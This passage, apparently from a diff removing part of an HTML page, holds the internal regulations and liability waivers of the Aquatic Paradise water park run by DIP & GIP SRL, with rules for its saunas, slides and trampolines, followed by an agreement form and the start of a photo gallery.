-	In particular, you, as beneficiary, declare that you understand and accept that the use of the CENTER facilities (swimming pools, slides, trampolines, playgrounds) implyes risks specific to sporting activities, and that you understand and accept that due to this risk inherent to sports, you may be injured within the AQUATIC PARADISE Center. In such cases, you accept that DIP &amp; GIP SRL is liable only for those damages, to your physical integrity, health or life, that have occurred as a direct result of an action or omission of DIP &amp; GIP.</div>
-<div>
-	&nbsp;</div>
-<div>
-	By expressing your consent to these CONDITIONS, you also declare that your health is good or at least appropriate for sports activities, and that you have acknowledged all recommendations and regulations on the use of the center in maximum safety and security with regard to the elimination and avoidance of possible risks.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Parents and accompanying persons who have children or other persons (mentally disabled persons, etc.) within their care are responsible for the compliance of these regulations by children and persons under their care or supervision.</div>
-<div>
-	&nbsp; &nbsp; Parents and accompanying persons will train and warn about the complex risks and will always accompany and supervise children and the people under their care.</div>
-<div>
-	&nbsp;</div>
-<div>
-	In all areas accessible to vehicles on the DIP &amp; GIP SRL property</div>
-<div>
-	&nbsp; - access ways, parking,</div>
-<div>
-	&nbsp; - It is mandatory to comply with all traffic rules provided in the Traffic Code</div>
-<div>
-	It is forbidden:</div>
-<div>
-	&nbsp;</div>
-<div>
-	- to exceed the speed limit indicated on traffic signs</div>
-<div>
-	&nbsp;</div>
-<div>
-	- not to comply with the significance of traffic signs</div>
-<div>
-	&nbsp;</div>
-<div>
-	- to park or stop in any other places than those specially designed for that</div>
-<div>
-	&nbsp;</div>
-<div>
-	- to block access ways</div>
-<div>
-	&nbsp;</div>
-<div>
-	- to throw trash or objects from the car</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	The use of the parking lot is provided exclusively to the beneficiaries of ALINALEX Hotel and the AQUATIC PARADISE Center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	The opening hours of the AQUATIC PARADISE are publicly displayed in the entrance lobby and on the website. The length of access depends on the fees paid. If the time spent exceeds the time the payment has been made for, then the corresponding additional amount will be paid before leaving the premises. Access to the center is allowed until no later than an hour and a half before the closing time of the day. The closing time is the time when you have to leave the premises of the AQUATIC PARADISE center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	The company management cans at any time limit the use, in whole or in part (e.g. technical defects, cleaning, and technical revision). In such cases, customers will be informed at the entrance, and they will make an informed choice, and they can not request discounts or reimbursments of the entry fee or raise any other material claims while using the services of the center.</div>
-<div>
-	Access inside the center requires customers to have bathing suits, slippers, towel and shower gels necessary the shower at the entrance in the center. Customers shall circulate inside the center by observing the access and circulation paths.</div>
-<div>
-	&nbsp;</div>
-<div>
-	For security reasons, areas within the center are partially monitored with surveillance cameras. Video records can only be accessed in case of suspicion by the persons empowered in accordance with the applicable regulations and by the police. They are used for the security and protection of visitors and the center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;The access of children under 14 years of age who are not accompanied by an adult is forbidden. For all minors (under and over 14), the liability for damages or accidents caused by them as well as for the failure to comply with the regulations is borne by the parents, or, in their absence, the guardian even if the parents or the guardian do not accompany the child.</div>
-<div>
-	The staff of the center has the right to request to any beneficiary to present an identification document or other evidence that indicates the age, position (pupil, student, and pensioner) to verify if they fulfill the access conditions.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Access of people suffering from fainting or epilepsy, as well as people suffering from cardiovascular diseases, contagious diseases, mental illness, and people with open wounds, rashes or diseases that can publicly offend is forbidden!</div>
-<div>
-	Access of people who do not know how to swim is forbidden unless they are accompanied by a person who knows how to swim. The accompanying person will closely supervise the person who does not know how to swim!&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	Access of people who are under the influence of alcohol, drugs or medicins that affect physical fitness is forbidden!</div>
-<div>
-	It is forbidden to leave the premises temporarily, after the cash registers or in areas that are not intended for circulation, except for short-term justified cases authorized by cash register workers (items forgotten in the car, etc.)!</div>
-<div>
-	Access with animals of any kind is forbidden.</div>
-<div>
-	Access in the center with firearms and any other weapons - any blunt object, paralyzing or neutralizing devices, etc. is forbidden.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Access with chemical and toxic substances - any chemical or toxic substance presenting a risk to the visitors&rsquo; health is forbidden.</div>
-<div>
-	The beneficiaries will leave luggage / items which don&rsquo;t have relaxation purposes in their personal changing rooms. Access to relaxation areas beyond the showers is only allowed with hand luggage containing objects intended for use for specific activities within the Center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp; &nbsp;No payment shall be refunded and no vouchers or other access documents which are lost or not used in due time shall be replaced. When ordering a service or product you have to check the data on the relevant tax bill; the change shall be immediately checked at the time of receipt of the bill; subsequent complaints will not be taken into consideration.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp; &nbsp;You, as a beneficiary, have an obligation to make sure that you meet the conditions for access to the various services of the complex and you know the rules of the Center.</div>
-<div>
-	&nbsp; It is your duty as a beneficiary to get informed about additional charges.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;Every beneficiary must keep the access card, bracelet and the borrowed objects so as to avoid losing them. The access bracelet will be worn throughout the stay, including during baths, and will not be left unattended. Failure to comply with these provisions has as a result, in the event of loss, the payment of their value.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Taxele de pierdere/deteriorare sunt afișate &icirc;n recepție la casa de intrare.</div>
-<div>
-	Loss / damage fees are displayed in the reception at the entrance.</div>
-<div>
-	The access fee does not guarantee the availability of a sunbed, which can be occupied within the limit of available seats.</div>
-<div>
-	Beneficiaries must behave in such a way that the safety, silence, order and cleanliness of the center are not disturbed.</div>
-<div>
-	&nbsp;</div>
-<div>
-	The equipment and facilities can only be used during their special opening hours. Please comply with the instruction plates of all facilities as well as the requests of the staff. It is also mandatory to comply with the existing special regulations for certain equipment and facilities that are brought to your attention by being displayed in that area or verbally by the staff of the center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp; &nbsp;The Aquatic Paradise warns you that there is an increased risk of slipping throughout the entire premises. Each beneficiary should take into account the increased risk of accidents on the premises due to wet surfaces and certain fixed or mobile obstacles (sunbeds, umbrellas, and other objects of the center or visitors).</div>
-<div>
-	&nbsp;</div>
-<div>
-	For this reason, the beneficiaries will wear anti-slip slippers, paying increased attention while circulating inside and outside the premises. Parents and accompanying people who have other people or children under their care will ensure that those children and people under their care wear the anti-slip slippers. If you, as a visiting customer, do not comply with this rule, you take responsibility for all injuries and damages caused by the non-compliance and exempt DIP &amp; GIP SRL from any liability.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Changing rooms will usually be used by one person.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Each beneficiary must use the showers before entering the pool area or after the sauna.</div>
-<div>
-	&nbsp;</div>
-<div>
-	It is forbidden to use soap or other body washes or body creams outside shower cabins.</div>
-<div>
-	&nbsp;</div>
-<div>
-	It is forbidden to enter the pool area or slides wearing long hair loose (it is recommended to use a swimming cap or at least to pull the hair in a ponytail).</div>
-<div>
-	&nbsp;</div>
-<div>
-	All children up to 3 years of age will wear special swim diapers in the pool. Children up to 5 years of age will wear swim water wings in swimming pools.</div>
-<div>
-	All children up to 14 years of age will be accompanied and supervised at all times by parents or accompanying people.</div>
-<div>
-	&nbsp;</div>
-<div>
-	It is forbidden to block the doors (especially emergency exit doors) or the access ways with sunbeds, bags, towels or other objects.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp; &nbsp;On the premises of the AQUATIC PARADISE the clients will behave in a civilized manner, and will keep quiet in the entire bathing and relaxation area, as well as in the saunas and the steam bath.</div>
-<div>
-	Each beneficiary is required to behave so that other customers are not disturbed.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Displays of affection must be decent, without disturbing the other people. Intimate interactions are punishable by evacuating the protagonists - without returning the value of entry tickets which have already been paid - and, where appropriate, the competent bodies will be notified.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Excessive alcohol consumption (getting tipsy, drunkenness) is forbidden, the center reserves the right to limit or refuse serving alcohol on a case-by-case basis, depending on circumstances as well as to forbid drunk people to drink alcohol and evacuate them from the center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	<strong>Sauna use</strong></div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp; &nbsp;Access to the sauna is at your own risk and is forbidden to people with cardiovascular disease, with febrile states with low or high blood pressure, with severe cardiovascular or bronchopulmonary disease, under the influence of alcoholic beverages, anticoagulants, antihistamines, vasoconstrictors, vasodilators, stimulants , narcotics or tranquilizers etc., as well as pregnant women or menstrual period. Usually, only healthy people can use saunas. If in doubt, ask a doctor to avoid possible complications.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Customers should enter the sauna is only with a towel that is large enough for the whole body (including underfoot) to avoid any kind of bank contamination. Alternatively, two towels, one for the body and one for the legs, can be used.</div>
-<div>
-	Prolonged exposure in the sauna can cause nausea, dizziness and fainting. Reasonable use of the sauna is up to 10 minutes.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Children under 14 years of age are forbidden to enter the sauna. The use of the sauna is forbidden to people under the influence of alcohol!</div>
-<div>
-	&nbsp;</div>
-<div>
-	For proper hygiene, the shower is mandatory both before and after using the sauna, and you can enter the sauna only after you got dried.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Slippers and bathrobes will be left out, at the entrance to saunas.</div>
-<div>
-	&nbsp;</div>
-<div>
-	It is forbidden to bring and use your own infusion solutions in saunas! The infusions will only be made by the specialized staff of the center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	After the sauna session, including the required cooling stage, the beneficiaries will cover themselves with a bathrobe or a towel.</div>
-<div>
-	&nbsp;</div>
-<div>
-	After each sauna session, cool yourself at one of the showers in the vicinity of the saunas or at the cold pool or feet pool, if your health condition allows you to do so, to bring the body temperature back to normal and to stimulate blood circulation.</div>
-<div>
-	Traditionally, there are special conditions in saunas, such as higher temperatures, diffused light, sauna seats and various heat sources. These require increased attention from beneficiaries.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Do not touch the technical equipment (e.g. lamps, sauna heaters /stoves, safety grilles and thermometers) and do not cover this equipment with objects / towels (fire hazard!).</div>
-<div>
-	&nbsp;</div>
-<div>
-	<strong>Slides and playground equipment</strong></div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp; &nbsp;The rules / instructions for using slides are listed on the instruction boards located next to each piece of equipment. Beneficiaries will read and follow these rules and instructions. The purpose of any limitations on use specified on these panels is mainly to ensure the safety of the beneficiaries. In case of inappropriate use, the clients assume the risk of injury.</div>
-<div>
-	People who are under the influence of alcohol are forbidden to use the slides and playground equipment.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Minor children must be accompanied, counseled and supervised by parents or adult carers.</div>
-<div>
-	People who do not know how to swim are forbidden to use the slides.</div>
-<div>
-	It is forbidden to use water slides before getting informed about the depth of water, how to use the slides, the correct position and all the recommendations and rules of use under maximum safety conditions!</div>
-<div>
-	&nbsp;</div>
-<div>
-	People suffering from fainting crises, panic attacks, epilepsy seizures, people with cardiovascular disease, claustrophobe people, people with poor health, or who have spinal cord injuries or other conditions which can constitute an accident risk are forbidden to use the slides.</div>
-<div>
-	People who, due to physical or mental disabilities, can only use slides in the presence of an adult accompanying person.</div>
-<div>
-	Children under 14 years of age will be permanently supervised by a parent / guardian. (Age prohibition).</div>
-<div>
-	&nbsp;</div>
-<div>
-	Elderly people need to pay more attention to the degree of difficulty before using slides.</div>
-<div>
-	It is mandatory to comply with the sliding position on the slide recommended by display materials and regulations for the use of slides!</div>
-<div>
-	It is mandatory to observe the colors of the traffic lights, namely:</div>
-<div>
-	<span style="color:#008000;">Green - access to the slide is allowed</span></div>
-<div>
-	<span style="color:#ff0000;">Red - access to the slide is prohibited</span></div>
-<div>
-	Access to the slides is done individually: access of two or more people on the slide is strictly forbidden!</div>
-<div>
-	It is mandatory to observe the rules / messages transmitted via the amplifier station!</div>
-<div>
-	Blunt instruments / hooks / hard objects on the slides are forbidden!</div>
-<div>
-	It is mandatory to avoid screams / whistles / yells or loud conversation!</div>
-<div>
-	It is mandatory to immediately leave the diving area in the slide pool!</div>
-<div>
-	It is mandatory to observe the recommendations and sound signals transmitted / issued by the life guards!</div>
-<div>
-	It is mandatory for all beneficiaries, before using any facility of the center, to know and comply with all regulations, recommendations and rules for use in a safe and secure manner; in the case of minor children the parents, accompanying persons or legal guardians bear all the responsability.</div>
-<div>
-	People who do not know how to swim or have no special floating equipment are forbidden to use the slides!</div>
-<div>
-	&nbsp;</div>
-<div>
-	People under the age limit recommended on the displayed panels are forbidden to use the slides!</div>
-<div>
-	The use of the facilities (slides, trampolines, pools) by beneficiaries who have on them equipment blunt objects, which may pose a risk of injury, is forbidden!</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	Particular attention must be paid to the following rules:</div>
-<div>
-	Climbing the slides will be done with great care, using the railing and taking into account the other customers. It is strictly forbidden to run!</div>
-<div>
-	&nbsp;</div>
-<div>
-	The slides can be used only after the route is cleared, at the green traffic light signal and only after you make sure that someone has not stopped on the slide, leaving enough safety space ahead. It is the responsibility of the visitor to make sure, before going on the slide.</div>
-<div>
-	&nbsp;</div>
-<div>
-	The customers shall observe the displayed safety instructions, the audio messages and the recommendations of the center staff.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	Lifeguards will make sure the customers leave the diving area after using the slide. Beneficiaries who do not immediately leave the diving area of the slide are responsible for the accidents caused in such manner.</div>
-<div>
-	The center is not responsible for damages to bathing suits caused by the use of slides.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	It is especially forbidden to:</div>
-<div>
-	&nbsp;</div>
-<div>
-	any sliding position other than that prescribed by the instructions</div>
-<div>
-	&nbsp;</div>
-<div>
-	stopping in the slipping area or at the end of the slide</div>
-<div>
-	climbing up the slide</div>
-<div>
-	&nbsp;</div>
-<div>
-	Nerespectarea acestor reguli pot provoca ACCIDENTE GRAVE.&nbsp;</div>
-<div>
-	Failure to comply with these rules may cause SERIOUS ACCIDENTS.</div>
-<div>
-	Beneficiaries will comply with the age limits for each type of slide. In the slides area, children aged 1-14 years will be accompanied and supervised permanently by a parent / guardian or an adult empowered by the parent or guardian.</div>
-<div>
-	&nbsp;</div>
-<div>
-	And if these rules are violated, access to the center may be prohibited, without refunding the amounts already paid.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	<strong>Using jump trampolines</strong></div>
-<div>
-	&nbsp;</div>
-<div>
-	People who do not know how to swim are forbidden to use the trampolines!</div>
-<div>
-	It is forbidden to use trampolines before getting informed about the depth of water, how to use the trampolines, the correct position and all the recommendations and rules of use under maximum safety conditions!</div>
-<div>
-	Children under 14 years of age will be permanently supervised by a parent / guardian!</div>
-<div>
-	&nbsp;</div>
-<div>
-	People suffering from fainting crises, panic attacks, epilepsy seizures, people with mental disabilities, people with cardiovascular disease, people with acrophobia (fear of heights), people with poor health, or who have spinal cord injuries or other conditions which can represent an accident risk are forbidden to use the trampolines.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Elderly people need to pay more attention to the degree of difficulty of the trampolines before using them and to the possible age risks, physical fitness, etc!</div>
-<div>
-	It is mandatory to observe the rules / messages transmitted via the amplifier station!</div>
-<div>
-	It is forbidden to wear blunt objects, cutters or other objects that can cause injuries!</div>
-<div>
-	It is mandatory to immediately leave the diving area in the pool on the routes established by the lifeguard!</div>
-<div>
-	It is mandatory to comply with the recommendations and sound signals transmitted / issued by the lifeguards!</div>
-<div>
-	Choosing wisely the height of the trampoline - 1.00m / 3.00m / 5.20m!</div>
-<div>
-	Getting on the trampoline with great care, holding onto the railing and taking into account the other customers.</div>
-<div>
-	It is forbidden to run, play or perform any other activity, on the climbing ramp or trampoline, which can disturb or distract the attention of the people who jump but also which can result in them getting injured!</div>
-<div>
-	Before making the jump, the customer will make sure that there is no one in the pool in the diving area!</div>
-<div>
-	Group jumps are absolutely forbidden / the activity is carried out strictly individually and in perfect order and quietly!</div>
-<div>
-	&nbsp;</div>
-<h3>
-	&nbsp;</h3>
-<h3>
-	THE FOLLOWING ACTS ARE STRICTLY FORBIDDEN:</h3>
-<div>
-	&nbsp;</div>
-<div>
-	screaming, aggressive tone, vociferation.</div>
-<div>
-	&nbsp;</div>
-<div>
-	swearing and indecent language / gestures.</div>
-<div>
-	&nbsp;</div>
-<div>
-	any manifestations of physical violence (including &quot;playing&quot;, pushing / bumping into other clients, etc.)</div>
-<div>
-	&nbsp;</div>
-<div>
-	access on slides with any kind of accessory that can bother or hurt the other beneficiaries or hurt yourself.</div>
-<div>
-	&nbsp;</div>
-<div>
-	using T-shirts in swimming pools, on trampolines or slides. Special swim shirts made of neoprene or similar materials or UV protection clothing for children are permitted.</div>
-<div>
-	&nbsp;</div>
-<div>
-	using mobile phones in a way that disturbs others (e.g. speaking loudly or taking pictures of others without their permission).</div>
-<div>
-	&nbsp;</div>
-<div>
-	entering the pool, slides, trampoline or saunas with the mobile phone.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Entering the pool or slides with photo, video cameras or recorder cameras.</div>
-<div>
-	&nbsp;</div>
-<div>
-	professional photography and filming, as well as shooting and filming other people without their consent (if it disturbs or violates their rights).</div>
-<div>
-	&nbsp;</div>
-<div>
-	You are the solely responsible for violating the rights of others in the following cases:</div>
-<div>
-	&nbsp;</div>
-<div>
-	Tearing down flowers</div>
-<div>
-	&nbsp;</div>
-<div>
-	dirting bathing areas and swimming pools (e.g. urinating and other removals in bathing water, rinsing glasses, washing off facial masks, etc.).</div>
-<div>
-	&nbsp;</div>
-<div>
-	Blocking emergency exits with sunbeds or other items.</div>
-<div>
-	&nbsp;</div>
-<div>
-	walking barefoot in front of the wardrobe cabinets.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Entering with street clothes or shoes in the showers as well as the entire relaxation area.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Shaving or dying your hair</div>
-<div>
-	&nbsp;</div>
-<div>
-	performing pedicures or manicures or other cosmetic or body treatments outside the cosmetic or massage room.</div>
-<div>
-	&nbsp;</div>
-<div>
-	bringing in the center food or drinks (especially alcoholic beverages) and objects prohibited by the regulations. It is allowed to bring special objects, food and beverages for children aged up to 3 years.</div>
-<div>
-	&nbsp;</div>
-<div>
-	passing with food or beverages from one area to another one of the center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	eating food or having drinks in the pool or slides or trampoline.</div>
-<div>
-	&nbsp;</div>
-<div>
-	bringing in weapons or tools.</div>
-<div>
-	&nbsp;</div>
-<div>
-	spitting on the floor or in the bathing water.</div>
-<div>
-	&nbsp;</div>
-<div>
-	smoking, including outside (including electronic cigarettes). Except in specially designed places with ashtrays for smokers in the outer areas of the premises.</div>
-<div>
-	&nbsp;</div>
-<div>
-	entering or getting out of the pools thourgh other places than by stairs and entrance. This rule is valid due to the danger of injury when attempting to enter through the edges of pools and their enclosed areas.</div>
-<div>
-	&nbsp;</div>
-<div>
-	leaving towels, bathrobes, t-shirts or other objects on the support bars.</div>
-<div>
-	&nbsp;</div>
-<div>
-	jumping from the edge of the pools or pushing or throwing other people in the water.</div>
-<div>
-	&nbsp;</div>
-<div>
-	performing gymnastics exercises on access stairs or support bars.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Wearing slippers or swimfins in the water.</div>
-<div>
-	&nbsp;</div>
-<div>
-	using inflatable water floats or other toys in the water.</div>
-<div>
-	&nbsp;</div>
-<div>
-	bringing in and using radio, TVs, music or signaling instruments, speakers.</div>
-<div>
-	&nbsp;</div>
-<div>
-	distribution of any advertising material, including in the parking lot.</div>
-<div>
-	organizing fundraisers of any kind.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	Food and beverages from the restaurant will be consumed exclusively in specially designed restaurant areas, on the terrace, in the outdoor bar areas. Drinks in unbreakable plastic, polycarbonate or cardboard containers can also be consumed in sunbed areas.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Liability</div>
-<div>
-	&nbsp;</div>
-<div>
-	All facilities and installations of the AQUATIC PARADISE will be used with care by the beneficiaries.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	Every client is responsible for damages caused by his actions or conduct, such as misuse, dirting or damaging the facilities of the center. Each beneficiary is also responsible for any damage that she/he causes to third parties (including injuring other clients).</div>
-<div>
-	For damages caused by children, the parents or guardians are liable in accordance with civil law.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp; &nbsp; EXCEPT AS REQUIRED BY LAW (AS SET OUT BELOW) AND OTHER THAN ANY OTHER MANDATORY LIABILITY PROVIDED BY LAW, TO THE FULLEST EXTENT PERMITTED BY APPLICABLE LAW, DIP &amp; GIP SRL ZARNESTI WILL UNDER NO CIRCUMSTANCES BE LIABLE TO YOU, AS A BENEFICIARY, FOR ANY INJURY, PREJUDICES OR DAMAGE TO YOU OR YOUR BELONGINGS, IN CONNECTION WITH YOUR PRESENCE INSIDE THE AQUATIC PARADISE CENTER OR THE USE OF THE FACILITIES AND SERVICES OFFERED BY THE AQUATIC PARADISE.</div>
-<div>
-	&nbsp; &nbsp;</div>
-<div>
-	DIP &amp; GIP SRL is liable for damages to the health, the bodily integrity or the life of the beneficiaries if they arise as a result of an action or omission of DIP &amp; GIP SRL regarding the use of the products and services. Correspondingly, DIP &amp; GIP SRL is not liable for damages to your health or life as a beneficiary, if these damages are due to you, or if they are caused by YOUR fault, or if they are due to others or are caused by their fault.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	You, as a Customer, accept and agree that DIP &amp; GIP SRL is not liable for damages, prejudices or material damage suffered by you in connection with your presence in the center or in connection with the use of facilities and services offered, as follows:</div>
-<div>
-	&nbsp;</div>
-<div>
-	- It is not liable in any way for the theft of your belongings on the premises. Beneficiaries are strongly advised not to bring valuable items. If, however, a customer has valuable items on her/him, she/he is advised to deposit them in the special cabinets for valuable items.</div>
-<div>
-	We specify that special cabinets are a facility offered to customers, and this offering does not imply that the Aquatic Paradise is liable for the content stored in them.</div>
-<div>
-	&nbsp;</div>
-<div>
-	- Nu &icirc;și asumă niciun fel de răspundere cu privire la supravegherea sau paza bunurilor luate de beneficiari &icirc;n incintă (inclusiv parcare). Prevederile din acest paragraf se aplică pentru bunurile depozitate at&acirc;t &icirc;n dulapul de vestiar, c&acirc;t și &icirc;ntr-un dulap pentru bunuri de valoare. Depunerea sau lăsarea de bani și de bunuri de valoare &icirc;n dulapul de vestiar sau &icirc;ntr-un dulap pentru bunuri de valoare pus la dispoziție de către operator nu implică niciun fel de obligații din partea complexului, cu privire la obiectele depozitate.</div>
-<div>
-	- The AQUATIC PARADISE has no obligation to ensure the custody or security of the belongings. Furthermore, it is strictly the responsibility of the user of the center to close the locker and / or the cabinet for valuable items after use, to check if it is properly locked and to carefully keep the key or bracelet.</div>
-<div>
-	&nbsp;</div>
-<div>
-	- It is not liable in any way for the destruction or damage of your belongings within the complex, no matter how they occur: mechanical damage, getting them wet, droping them in the pools, droping them on the floor, etc.</div>
-<div>
-	&nbsp;</div>
-<div>
-	- It is not liable for the vehicles in the parking lot or for the personal belongings left in the vehicles; it has no liability for damage, destruction or theft of vehicles by third parties for vehicles parked in parking spaces. THE TRAFFIC CODE is valid both in the parking lot and all traffic areas of the center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	DIP &amp; GIP SRL is liable for damages, prejudices and material damages that are caused intentionally to you or through gross negligence or which you are caused by failing to fulfill the contractual obligations expressly assumed.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	The center assumes no liability for any changes in color, discoloration or damage to bathing suits or jewelery / watches, as these may occur due to the composition of water, sun, etc.</div>
-<div>
-	&nbsp;</div>
-<div>
-	DIP &amp; GIP SRL is not liable for the damages caused to beneficiaries in cases of force majeure, accidents or malfunctions (storm, snow, electric discharge, blackout, etc.).</div>
-<div>
-	&nbsp;</div>
-<div>
-	Customers who find objects on the premises or in the parking lot will hand them over to the reception. All items forgotten after the closing hours are collected and stored as follows:</div>
-<div>
-	&nbsp;</div>
-<div>
-	- Valuable items (including but not limited to: phones, tablets, jewelry, laptops, electronics, amounts of money greater than 100 lei, etc.) shall be stored for the legal term of 10 days; after the expiration of the legal term these goods are handed over to the authorities.</div>
-<div>
-	&nbsp;</div>
-<div>
-	- Low value items will be kept for a period of 2 months after which they will be donated to a non-profit association or institution.</div>
-<div>
-	&nbsp;</div>
-<div>
-	You, as beneficiary, agree to the following:</div>
-<div>
-	&nbsp;</div>
-<div>
-	- You agree with that the Aquatic Paradise has the right to determine what objects are of value or not.</div>
-<div>
-	&nbsp;</div>
-<div>
-	- You agree to donate lost items, as the Aquatic Paradise decides, to a non-profit association or institution.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	<strong>Access prohibition</strong></div>
-<div>
-	&nbsp;</div>
-<div>
-	If you fail to comply with the obligations set out in this regulation DIP &amp; GIP SRL has the right to declare the immediate termination of the contract concluded with you - the termination of the contract takes place at the moment when you are verbally informed by the staff of the center that you have the obligation to leave the premises without any further formality.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Verbal aggression of any kind or any other indecent, aggressive or inappropriate manifestations.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Screaming, aggressive tone of voice, high tone of voice, noise</div>
-<div>
-	&nbsp;</div>
-<div>
-	swearing and indecent language / gestures.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Disturbing safety and order</div>
-<div>
-	&nbsp;</div>
-<div>
-	Disturbing in any way other visitors</div>
-<div>
-	Damaging, vandalising the goods of the center</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	If DIP &amp; GIP SRL has declared the termination of the contract and the staff has informed you that you have the obligation to leave the premises, you must immediately hand over the objects belonging to the center (including the access bracelet), pay for the services (if necessary) and immediately leave the center quietly.</div>
-<div>
-	If you fail to comply with the provisions of this paragraph, the intervention of competent bodies will be required.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	If DIP &amp; GIP SRL has declared the termination of the contract, and the staff informed you that you have the obligation to leave the premises and if you do not pay for your obligations at the exit, DIP &amp; GIP SRL RESERVES THE RIGHT TO PROHIBIT YOUR ACCESS .</div>
-<div>
-	&nbsp;</div>
-<div>
-	Illegal entry on the property or within the complex, not paying the entry fee, or attempts to do so, or useing fraudulent payment services, will result into immediate eviction from the premises, and police will be immediately notified.</div>
-<div>
-	&nbsp;</div>
-<div>
-	Any discrimination based on race, nationality, ethnicity, language, religion, social category, beliefs, sex, sexual orientation, age, disability, etc., or on any other criterion whose purpose or effect is restricting the use or exercise, on an equal basis, of any legal rights is forbidden inside the AQUATIC PARADISE center.</div>
-<div>
-	&nbsp;</div>
-<div>
-	By entering the AQUATIC PARADISE center you explicitly and unequivocally express your consent to the collection and processing of personal data, both by completing forms as well as by using video surveillance systems for the legitimate purposes permitted by law.</div>
-<div>
-	The internal regulations and the regulations for the use of swimming pools, slides, trampolines and other facilities of the center are valid for the general use of swimming pools, slides, saunas and other facilities within the center. In the case of special events, exceptional rules may apply, without the need for a special revocation of the Internal Regulations and the use of the AQUATIC PARADISE equipment.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	Any person who is part of the staff of the AQUATIC PARADISE center may exercise the rights provided for in this Regulation for any beneficiary. The instructions of the AQUATIC PARADISE center staff must be observed by the beneficiaries.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp;</div>
-<div>
-	- The internal regulations and the regulations for the use of the AQUATIC PARADISE equipment are in force as from 1st of January 2017.</div>
-		</div>
-		<div id="regulation_modal_footer">
-		<form action="index.html" method="post" enctype="multipart/form-data">
-			<input type="hidden" name="doit_agree_regulation" value="3" />
-			<input type="submit" id="agree_to_regulation" value="I agree to the terms and conditions" />
-		</form>
-		</div>
-	</div>
-</div>
-
-<div id="testimonials-pop-overlay">
-<div id="testimonials-wrapp">
-	<a href="index.html#" id="testimonials-close">Close</a>
-    <span>Momentan nu exista nici o postare!</span> 
-</div>
-</div>
-
-
-<div id="parad-photo-pop-overlay">
-<div id="parad-photo-wrapp">
-	<a href="index.html#" id="parad-photo-close">Close</a>
-<div id="parad-photo-inner">
-    <h2>
-	Photo gallery</h2>
-
-    <div class="gallery_block">
-							<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10075.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10075.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10075.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10074.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10074.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10074.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10073.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10073.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10073.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10072.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10072.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10072.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10070.jpeg);">
